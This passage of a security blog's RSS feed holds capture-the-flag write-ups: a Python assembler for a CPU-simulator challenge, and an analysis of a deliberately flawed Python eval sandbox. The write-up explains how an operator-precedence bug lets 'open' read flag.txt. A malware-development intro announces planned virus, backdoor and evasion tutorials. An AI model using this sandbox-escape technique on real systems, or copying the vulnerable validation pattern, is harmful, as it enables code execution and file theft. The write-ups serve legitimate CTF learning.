&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As &lt;code&gt;movl&lt;/code&gt;, those instructions are always executed since they are not directly plugged to &lt;code&gt;IR&lt;/code&gt; but the multiplexer that is sending the result into output is so by manually setting registers and &lt;code&gt;IR&lt;/code&gt;, we can identify the opcodes by looking at the value of the CUs output register (we didnt manage to find a way to examine the internal circuits of the multiplexers and reading the XML seemed painful). By trying the few opcodes left, we got :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Opcode&lt;/th&gt;
&lt;th&gt;Instruction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x1a&lt;/td&gt;
&lt;td&gt;msk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1b&lt;/td&gt;
&lt;td&gt;mskb&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;Now that understand how the processor is working we can try to make a compiler to compile &lt;code&gt;program.asm&lt;/code&gt; into &lt;code&gt;program.data&lt;/code&gt;.
To do so we have to clarify a few things first :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Another odd thing in the code is the &lt;code&gt;sub5&lt;/code&gt; value that is not preceded by colons unlike the others, we assumed that it didnt matter and it worked (we added the colons in the file to make the compiler simpler).&lt;/li&gt;
&lt;li&gt;Last thing we didnt mention is that every instruction that needs less than two operands is padded with zeros so it stays 3-bytes long (wed like to thank the challenge maker for putting zeros in the code when the second operand was useless, it makes the compiler way easier to make).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here comes our compiler :&lt;/p&gt;
&lt;p&gt;


  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;compiler.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
def get_instruction_type(instruction):
    if instruction[0] == &amp;#39;:&amp;#39;:
        return &amp;#39;label&amp;#39;
    return &amp;#39;instruction&amp;#39;

def get_opcode(instr):
    translate_table = [
        &amp;#34;add&amp;#34;,
        &amp;#34;sub&amp;#34;,
        &amp;#34;mul&amp;#34;,
        &amp;#34;clr&amp;#34;,
        &amp;#34;rst&amp;#34;,
        &amp;#34;jmp&amp;#34;,
        &amp;#34;ljmp&amp;#34;,
        &amp;#34;jlp&amp;#34;,
        &amp;#34;jg&amp;#34;,
        &amp;#34;jge&amp;#34;,
        &amp;#34;jl&amp;#34;,
        &amp;#34;jle&amp;#34;,
        &amp;#34;je&amp;#34;,
        &amp;#34;jz&amp;#34;,
        &amp;#34;jnz&amp;#34;,
        &amp;#34;mov&amp;#34;,
        &amp;#34;movl&amp;#34;,
        &amp;#34;call&amp;#34;,
        &amp;#34;ret&amp;#34;,
        &amp;#34;cmp&amp;#34;,
        &amp;#34;push&amp;#34;,
        &amp;#34;pop&amp;#34;,
        &amp;#34;div&amp;#34;,
        &amp;#34;mmiv&amp;#34;,
        &amp;#34;mmov&amp;#34;,
        &amp;#34;&amp;#34;,
        &amp;#34;msk&amp;#34;,
        &amp;#34;mskb&amp;#34;
    ]
    return format(translate_table.index(instr), &amp;#39;02x&amp;#39;)


def get_label_encoded(word, labels):
    # Very ugly but there is only one so it&amp;#39;s fine
    if &amp;#39;&amp;#43;1&amp;#39; in word:
        return &amp;#39;2f&amp;#39;
    else:
        return labels[word]

def get_operand_code(word, labels):
    regs = [&amp;#39;ax&amp;#39;, &amp;#39;bx&amp;#39;, &amp;#39;cx&amp;#39;, &amp;#39;dx&amp;#39;]
    if &amp;#39;:&amp;#39; in word:
        return get_label_encoded(word, labels)
    if &amp;#39;x&amp;#39; in word:
        if word in regs:
            return format(regs.index(word), &amp;#39;02x&amp;#39;)
        else:
            return format(int(word, 16), &amp;#39;02x&amp;#39;)
    else:
        return format(int(word), &amp;#39;02x&amp;#39;)


def get_instruction_sequence(instruction, labels):
    words = instruction.split()
    opcode = get_opcode(words[0])
    op1 = &amp;#39;00&amp;#39;
    op2 = &amp;#39;00&amp;#39;
    if len(words) == 3:
        op1 = get_operand_code(words[1].strip(&amp;#39;,&amp;#39;), labels)
        op2 = get_operand_code(words[2], labels)
    return opcode &amp;#43; op1 &amp;#43; op2

if __name__ == &amp;#39;__main__&amp;#39;:
    # don&amp;#39;t forget to add the &amp;#39;:&amp;#39; in front of sub5 line 53 or compiler will crash
    program_file = &amp;#39;./program.asm&amp;#39;
    output_file = &amp;#39;./program.data&amp;#39;
    filestream = open(program_file)
    program = filestream.read().splitlines()
    filestream.close()
    labels = {}
    data = []
    for index, instruction in enumerate(program):
        type = get_instruction_type(instruction)
        if type == &amp;#39;label&amp;#39;:
            labels[instruction] = format(index - len(labels), &amp;#39;02x&amp;#39;)
    # print(labels)
    for instruction in program:
        type = get_instruction_type(instruction)
        if type == &amp;#39;instruction&amp;#39;:
            data.append(get_instruction_sequence(instruction.strip(), labels))
    filestream = open(output_file, &amp;#39;w&amp;#39;)
    filestream.write(&amp;#39; &amp;#39;.join(data))
    filestream.close()
    print(&amp;#39;Program has been compiled in :&amp;#39;, output_file)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


a
Once our compiler has been written, we just have to compile the program, import it in the RAM then launch the simulation.
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_compiled.png&#34; alt=&#34;import&#34;&gt;
After a little while (a long while if you dont increase the auto-tick frequency), the flag will be displayed on the TTY to the right.
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_flag.png&#34; alt=&#34;flag&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Tree of danger - [HTB UNICTF 2021 - Qualifiers]</title>
      <link>https://alagroy-42.github.io/writeups/tree_of_danger/</link>
      <pubDate>Tue, 14 Jun 2022 14:53:57 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/tree_of_danger/</guid>
      <description>The Challenge python util.py #!/usr/bin/env python3.10 import ast import math from typing import Union def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool: match type(node): case ast.Constant: return True case ast.List | ast.Tuple | ast.Set: return is_sequence_safe(node) case ast.Dict: return is_dict_safe(node) case ast.Name: return node.id == &amp;#34;math&amp;#34; and isinstance(node.ctx, ast.Load) case ast.UnaryOp: return is_expression_safe(node.operand) case ast.BinOp: return is_expression_safe(node.left) and is_expression_safe(node.right) case ast.Call: return is_call_safe(node) case ast.Attribute: return is_expression_safe(node.value) case _: return False def is_sequence_safe(node: Union[ast.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;util.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/env python3.10

import ast
import math
from typing import Union


def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool:
    match type(node):
        case ast.Constant:
            return True
        case ast.List | ast.Tuple | ast.Set:
            return is_sequence_safe(node)
        case ast.Dict:
            return is_dict_safe(node)
        case ast.Name:
            return node.id == &amp;#34;math&amp;#34; and isinstance(node.ctx, ast.Load)
        case ast.UnaryOp:
            return is_expression_safe(node.operand)
        case ast.BinOp:
            return is_expression_safe(node.left) and is_expression_safe(node.right)
        case ast.Call:
            return is_call_safe(node)
        case ast.Attribute:
            return is_expression_safe(node.value)
        case _:
            return False


def is_sequence_safe(node: Union[ast.List, ast.Tuple, ast.Set]):
    return all(map(is_expression_safe, node.elts))


def is_dict_safe(node: ast.Dict) -&amp;gt; bool:
    for k, v in zip(node.keys, node.values):
        if not is_expression_safe(k) and is_expression_safe(v):
            return False
    return True


def is_call_safe(node: ast.Call) -&amp;gt; bool:
    if not is_expression_safe(node.func):
        return False
    if not all(map(is_expression_safe, node.args)):
        return False
    if node.keywords:
        return False
    return True


def is_safe(expr: str) -&amp;gt; bool:
    for bad in [&amp;#39;_&amp;#39;]:
        if bad in expr:
            # Just in case!
            return False
    return is_expression_safe(ast.parse(expr, mode=&amp;#39;eval&amp;#39;).body)


if __name__ == &amp;#34;__main__&amp;#34;:
    print(&amp;#34;Welcome to SafetyCalc (tm)!\n&amp;#34;
          &amp;#34;Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc&amp;#34;)
    while True:
        ex = input(&amp;#34;&amp;gt; &amp;#34;)
        if is_safe(ex):
            try:
                print(eval(ex))
            except Exception as e:
                print(f&amp;#34;Something bad happened! {e}&amp;#34;)
        else:
            print(&amp;#34;Unsafe command detected! The snake approaches...&amp;#34;)
            exit(-1)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;This Python script is gonna interpret python code with the &lt;code&gt;eval&lt;/code&gt; function after doing some parsing with the AST module. The parsing is gonna make sure that every component of the evaluated expression is safe. Function calls are only considered safe if they are part of the &lt;code&gt;math&lt;/code&gt; module. After reading the &lt;code&gt;math&lt;/code&gt; documentation, we realized that there was no way of doing nasty things with any function so we decided to try to bypass the AST checks.&lt;/p&gt;
&lt;h3 id=&#34;the-resolution&#34;&gt;The Resolution&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_source_code.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this function, the if statement line 37 doesn&amp;rsquo;t take into account operator precedence in Python, since &lt;code&gt;not&lt;/code&gt; has a higher precedence than &lt;code&gt;and&lt;/code&gt;, &lt;code&gt;not&lt;/code&gt; only applies to the key verification and not to the value verification. If it returns &lt;code&gt;True&lt;/code&gt;, then the value of the dictionary is not gonna be checked. Thanks to that vulnerability, we can embed the open symbol in the dictionary.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_embedded.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
&lt;p&gt;Function calls are sanitized with a check on &lt;code&gt;ast.Name&lt;/code&gt; values which checks any normal function call but not class methods that are considered by the AST module as &lt;code&gt;ast.Attribute&lt;/code&gt;. Dereferencing a dictionary by calling directly the value is an &lt;code&gt;ast.Subscript&lt;/code&gt; type of operation which returns &lt;code&gt;False&lt;/code&gt;. We then have to call &lt;code&gt;dictionary.get&lt;/code&gt; to get &lt;code&gt;open&lt;/code&gt; and then call it on &lt;code&gt;flag.txt&lt;/code&gt;. Once the file is opened, we simply need to add the read method to get the content of it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_flag.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Malware Development</title>
      <link>https://alagroy-42.github.io/malware/</link>
      <pubDate>Tue, 14 Jun 2022 14:24:47 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware/</guid>
      <description>A quick dive into malware development Disclaimer First of all, I want to say that my point with this blog is not to encourage people to be Black Hats and do anything illegal. I deeply believe though that knowledge should be shared for a few reasons, first, there are some mean and malicious people out there and anyone working in Infosec should be able to understand what they do to prevent it.</description>
      <content>&lt;h1 id=&#34;a-quick-dive-into-malware-development&#34;&gt;A quick dive into malware development&lt;/h1&gt;
&lt;h2 id=&#34;disclaimer&#34;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;First of all, I want to say that my point with this blog is not to encourage people to be Black Hats and do anything illegal. I deeply believe though that knowledge should be shared for a few reasons, first, there are some mean and malicious people out there and anyone working in Infosec should be able to understand what they do to prevent it. Second, some aspects of malware development are technically very interesting and quite challenging which is also why I like it. Now that it is said, please be responsible.&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Malware is a word that is used to designate any malicious software which does things without the user consent. There are many families of malware, the most famous ones are :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ransomware: malware that will steal and encrypt all the data from a system and then ransom it against money&lt;/li&gt;
&lt;li&gt;viruses: malware that will self-replicate and infect other software, mainly legitimate, of a system.&lt;/li&gt;
&lt;li&gt;worms: malware that will self-replicate and spread through the network&lt;/li&gt;
&lt;li&gt;trojans: software that looks legitimate but that will actually harm the computer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We will mainly focus on viruses here because it is how I started and even though they are not as widely used today as they used to be, they are still a good way to grasp some very low-level concepts that are still widely used on modern malware.&lt;/p&gt;
&lt;p&gt;Before getting in the topic, I strongly recommend working inside a virtual machine, it will allow you to launch your virus safely without being afraid of infecting yourself.&lt;/p&gt;
&lt;p&gt;Now that you have a virtual machine installed and configured, let&amp;rsquo;s start !&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_basics/&#34;&gt;Infectors: How to make a simple self-replicating program on Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced/&#34;&gt;Advanced infectors: How to make our infector stealthy and hardly detectable&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;&#34;&gt;The payload: How to setup a backdoor on a computer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;&#34;&gt;Obfuscation: The Art of pissing off reverse-engineers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;&#34;&gt;Oligomorphism: How to encrypt our virus and evade signature-based detection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>CTFs</title>
      <link>https://alagroy-42.github.io/ctfs/</link>
      <pubDate>Tue, 14 Jun 2022 14:24:19 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/ctfs/</guid>
      <description>Here are the different CTFs I took part of with the team I was in and our ranking.
2022 Hunt EGE 2022 - On-site OSINT CTF and Hunt in Paris Team: APT42 Ranking: #4/13 SaarCTF 2022 - Attack/Defense Team: APTduoquadra Ranking: #26/88 HackTheBox Uni CTF 2022 Finals - Jeopardy/FullPwn Team: APTduoquadra Ranking: #3/25 2021 HackTheBox Uni CTF 2021 Qualifiers - Jeopardy/FullPwn CTF open for every university in the world Team: APTduoquadra Ranking: #2/576 Bambictf #6 - Beginner-oriented Attack/Defense CTF Team: APTduoquadra Ranking: #34/60 </description>
      <content>&lt;p&gt;Here are the different CTFs I took part of with the team I was in and our ranking.&lt;/p&gt;
&lt;h1 id=&#34;2022&#34;&gt;2022&lt;/h1&gt;
&lt;h4 id=&#34;hunt-ege-2022---on-site-osint-ctf-and-hunt-in-paris&#34;&gt;Hunt EGE 2022 - On-site OSINT CTF and Hunt in Paris&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Team: APT42&lt;/li&gt;
&lt;li&gt;Ranking: #4/13&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;saarctf-2022---attackdefense&#34;&gt;SaarCTF 2022 - Attack/Defense&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #26/88&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;hackthebox-uni-ctf-2022-finals---jeopardyfullpwn&#34;&gt;HackTheBox Uni CTF 2022 Finals - Jeopardy/FullPwn&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #3/25&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2021&#34;&gt;2021&lt;/h1&gt;
&lt;h4 id=&#34;hackthebox-uni-ctf-2021-qualifiers---jeopardyfullpwn-ctf-open-for-every-university-in-the-world&#34;&gt;HackTheBox Uni CTF 2021 Qualifiers - Jeopardy/FullPwn CTF open for every university in the world&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #2/576&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;bambictf-6---beginner-oriented-attackdefense-ctf&#34;&gt;Bambictf #6 - Beginner-oriented Attack/Defense CTF&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #34/60&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>About</title>
      <link>https://alagroy-42.github.io/about/</link>
      <pubDate>Tue, 14 Jun 2022 14:23:54 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/about/</guid>
      <description>whoami I am a cybersecurity student that aims to be a malware analyst in the future.</description>
      <content>&lt;h2 id=&#34;whoami&#34;&gt;whoami&lt;/h2&gt;
&lt;p&gt;I am a cybersecurity student that aims to be a malware analyst in the future.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
